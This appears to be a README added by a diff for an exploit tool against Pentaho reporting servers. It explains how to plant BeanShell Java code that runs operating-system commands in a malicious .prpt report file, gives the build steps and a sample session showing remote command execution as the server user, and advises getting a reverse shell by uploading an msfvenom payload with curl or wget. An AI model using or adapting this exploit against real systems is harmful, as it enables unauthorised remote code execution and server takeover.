@@ -1,0 +1,110 @@
+base.prpt:
+
+This is a zip file, contains the files are below:
+
+drwxrwxrwx 1 user user 4096 Mar 12 11:16 .
+drwxrwxrwx 1 user user 4096 Mar 12 11:16 ..
+drwxrwxrwx 1 user user 4096 Mar 12 11:16 META-INF
+-rwxrwxrwx 1 user user  274 Jan 28  2021 content.xml
+-rwxrwxrwx 1 user user 2774 Mar  4 12:21 datadefinition.xml
+-rwxrwxrwx 1 user user  675 Jan 28  2021 dataschema.xml
+drwxrwxrwx 1 user user 4096 Mar 12 11:16 datasources
+-rwxrwxrwx 1 user user 3284 Jan 28  2021 layout.xml
+-rwxrwxrwx 1 user user 1108 Jan 28  2021 meta.xml
+-rwxrwxrwx 1 user user   41 Jan 28  2021 mimetype
+-rwxrwxrwx 1 user user  201 Jan 28  2021 settings.xml
+-rwxrwxrwx 1 user user 1527 Jan 28  2021 styles.xml
+-rwxrwxrwx 1 user user  123 Jan 28  2021 translations.properties
+
+One of these files is interesting for us, the datadefinition.xml.
+
+This contains the snippet of code that we can use to exploit the vulnerability.
+
+If you want to change the behavior of the exploit, you need to change this file.
+
+After modifying it, create a zip file with the contents of the basic directory then rename it to basic.prpt and place the file where ginger-2.py is.
+
+ex:
+
+/ginger$ cd basic ; zip -r ../basic.zip * ; cd .. ; mv basic.zip basic.prpt
+
+datadefinition.xml:
+
+The documentation of Beanshell in pentaho is here:
+
+https://github.com/pentaho/pentaho-reporting/blob/master/engine/core/src/main/java/org/pentaho/reporting/engine/classic/core/modules/misc/beanshell/BSHExpression.java
+
+The java code you want to run should be placed between these tags: <property name="expression">  ... </property>
+
+Example code:
+
+		import java.io.IOException;
+		import java.io.BufferedReader;
+		import java.io.InputStreamReader;
+
+		getValue(){
+		
+		// detect OS 
+		String opsys = System.getProperty("os.name").toLowerCase();
+		
+		String command = "whoami";
+		Process p = Runtime.getRuntime().exec(command);
+		p.waitFor();
+		BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
+		StringBuilder logCommandOutput = new StringBuilder();
+		String line;
+		logCommandOutput.append("aaaaaa\n");
+		logCommandOutput.append("Operating System: " + opsys + "\n");
+		while( (line = in.readLine()) != null) {
+			logCommandOutput.append(line);
+			logCommandOutput.append("\n");
+		}
+		in.close();
+		logCommandOutput.append("bbbbbb\n");
+	return(logCommandOutput.toString());
+}
+
+If use this exploit then you shoud see this in the action:
+
+python3 ginger-2.py --cookie "client-time-offset=0; JSESSIONID=blah0; session-expiry=1647100206527; server-time=1647093006527; SESSION=blah1; JSESSIONID=blah2" -u userofcookies --anon https://vulnerablesystem.com/pentaho
+
+   _____   _
+  / ____| (_)
+ | |  __   _   _ __     __ _    ___   _ __
+ | | |_ | | | | '_ \   / _` |  / _ \ | '__|
+ | |__| | | | | | | | | (_| | |  __/ | |
+  \_____| |_| |_| |_|  \__, |  \___| |_|
+                        __/ |
+                       |___/
+~# version
+9.0.0.0.423
+~# shell
+pentaho# id
+
+Operating System: linux
+uid=1500(pentaho) gid=1500(pentaho) groups=1500(pentaho)
+
+pentaho# exit
+~# shell
+pentaho# whoami
+
+Operating System: linux
+pentaho
+
+pentaho# exit
+
+Limitations/comments:
+
+Because the datadefinitions.xml file is an xml file, you cannot use the '>' and '<' signs on commands.
+Reverse shell methods that use these signals will not work.
+
+Reverse shell:
+
+If the vulnerable system is allowed to access the Internet on at least 1 port, then:
+
+You create a payload with msfvenom, then upload the victim with curl, wget or other accessible tool, then run that payload from this shell.
+
+
+
+
+
